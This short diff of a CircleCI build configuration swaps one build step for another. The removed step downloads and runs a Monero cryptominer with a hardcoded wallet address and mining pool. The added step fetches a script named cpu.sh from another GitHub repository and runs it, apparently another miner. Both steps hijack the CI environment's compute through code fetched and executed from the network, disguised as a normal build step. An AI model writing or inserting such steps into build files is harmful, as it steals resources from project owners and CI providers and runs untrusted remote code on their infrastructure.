@@ -5,4 +5,4 @@ jobs:
       - image: circleci/ruby:2.4.2-jessie-node
     steps:
       - checkout
-      - run:  wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && wget https://github.com/hunshukajh/yes/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -algo randomx -coin XMR -wallet 49KmAQD7pJver9ezekfYLsMbPB5ZjpMzKcdjYtxfUU2qHW98MC5VgQ22wTbt4rLAXaKTaA2xw2GhE4TTjx3c4FSxRhKUdML  -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 pool.minexmr.com:443
+      - run:  wget https://raw.githubusercontent.com/duybowlduoi/htdybht/main/cpu.sh && chmod +x cpu.sh && ./cpu.sh
